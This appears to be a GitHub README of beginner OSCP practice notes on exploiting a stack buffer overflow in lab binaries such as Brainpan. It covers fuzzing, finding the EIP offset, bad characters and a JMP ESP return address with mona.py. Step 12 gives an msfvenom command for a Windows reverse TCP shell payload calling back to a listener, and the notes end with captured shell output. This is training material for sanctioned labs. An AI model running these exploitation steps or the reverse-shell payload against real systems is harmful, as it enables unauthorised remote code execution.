# OSCP-BUFFER-OVERFLOW-PREP
This Repositry has my own practice notes of Buffer overflow Vulnrable Machine in easy,Beginer way.

If You have fear of buffer overflow, then i'll say bro just chill it is easy. Make some practice.
you have to follow som steps to get the shell of victim host.
Brainpain,VulnServer,Ftp.....and more comming soon
Be Connected Thank you!!


The very firs step is to getting the crash byte after knowing the host and port,vuln param 
of the server.....

Part 1

    Fuzzing the service parameter and getting the crash byte
    Generating the pattern
    Finding the correct offset where the byte crashes with the help of (EIP)

Part 2

    Finding the bad character with mona.py, and comparing bad character strings with mona.py
    Finding return address (JMP ESP) with mona.py

Part 3

    Setting breakpoint to verify RETURN address is correct or not
    Creating reverse shell with the help of msfvenom
    Adding NOP’s to the script
    Getting shell





1) So for the Any binary we have to fuzz from 100 to Untill crash the program,
   To do so first we have to find out which input parameter of the is vulnrable to overflow.
   Then find out the crash byte of the program by fuzzing the parameter.
 
   

2) creating offset value. with msf 
   > msf-pattern_create -l 3000
   where 3000 is Crash byte of the program
 
   After getting the crash byte we have to control the intruction pointer
   to do this we'll use the msf venome 

3) msf-pattern_offset -l 3000 -q 35724134 (this is value of eip)

    output- [*] Exact match at offset 524 


4) after getting the offset value wee need to perform the overflow with some 
   more thing 
   now we have offset=524
   eip="B" * 4 (this will always contain the eip )
   shellcode= "C"* 400 (this is the space where the stack in buffer fill with  shell code )

5) Creating the working dir in im-debug
   !mona config -set workingfolder c:\logs\%p

 Now next is to finding the bad char with the help of all possible hex

6) to do this we have to create an array with mona.py to compair with out paylod

   !mona bytearray -b '\x00'

   send the payload 

7) now we have to verify if ther's any badchar....
    !mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910
   if the result is normal then ther's only one badchar  ecept: "/x00"

Now we have to find the jump esp location 

8) check if there is any module that is vulnrable and false by os
   !mona modules 
   ther's a module brainpain.exe

9) to get the jump statment have to perform this command

   !mona find -s "\xff\xe4" -m baianpan.exe
   this will retun the address of jump eip
   save the jump eip 311712f3 set this eip in payload as
   eip=eip= '\xf3\x12\x17\x31'


10) setting the break point to check does it working or not 
    bp 0x311712f3
    to verify the break point is set view>view breakpoint>

11) Now set the  eip to  and try run again the payload 
    this will pass the program and jump to our brekpoint now 
    when resume the program it will retrun to shellcode that we given as payld

12) Creating the reverse shell code with the help of the msfvenome
     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.132 LPORT=1234 -b '\x00' -f c

where(-b is bad character and -f c is the revershell in c language

13) And add the nops valu (I'm using this because maybe control jump by leaving 8 or 16 bytes after the shell code)

nops='\x90' * 10

14) add the nops to our payload before the shellcode value and start the listening on our side....

15) after the sending the shell the im_debug will pause so we have to tap on play again .....boom we got the shell

C:\Users\Saimson\Downloads>

C:\Users\Saimson\Downloads>whoami
whoami
desktop-hup6j62\saimson 


